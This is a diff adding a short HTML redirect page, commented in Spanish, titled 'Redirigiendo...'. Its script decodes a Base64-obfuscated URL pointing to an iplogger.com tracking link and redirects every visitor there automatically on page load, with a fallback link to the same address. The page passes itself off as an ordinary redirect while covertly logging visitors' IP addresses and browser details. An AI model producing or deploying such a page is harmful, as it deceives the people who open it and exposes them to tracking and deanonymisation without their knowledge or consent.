@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirigiendo...</title>
+</head>
+<body>
+    <script>
+        // URL codificada en Base64
+        var urlCodificada = "aHR0cHM6Ly9pcGxvZ2dlci5jb20vMlhGMHI1";
+
+        // Decodificar la URL
+        var url = atob(urlCodificada);
+
+        // Redirigir a la URL decodificada
+        window.location.href = url;
+    </script>
+    <p>Si no eres redirigido automáticamente, haz clic <a id="link" href="#">aquí</a>.</p>
+    <script>
+        // Asignar la URL decodificada al enlace de reserva
+        document.getElementById("link").href = url;
+    </script>
+</body>
+</html>
